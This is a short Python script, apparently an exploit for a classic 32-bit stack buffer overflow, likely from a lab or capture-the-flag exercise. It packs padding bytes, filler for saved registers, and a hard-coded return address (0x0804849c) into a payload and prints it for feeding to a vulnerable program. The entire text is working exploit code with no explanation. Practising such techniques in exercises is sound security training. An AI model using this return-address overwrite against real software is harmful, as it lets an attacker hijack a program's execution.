from struct import pack

ret_adress = 0x0804849c
output = "A" * 10
output += "BBBB"
output += "CCCC"
output += pack("<I", ret_adress)

print(output)